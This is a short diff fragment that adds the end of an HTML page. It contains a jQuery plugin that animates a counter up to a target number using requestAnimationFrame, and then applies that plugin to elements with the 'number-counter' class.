+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
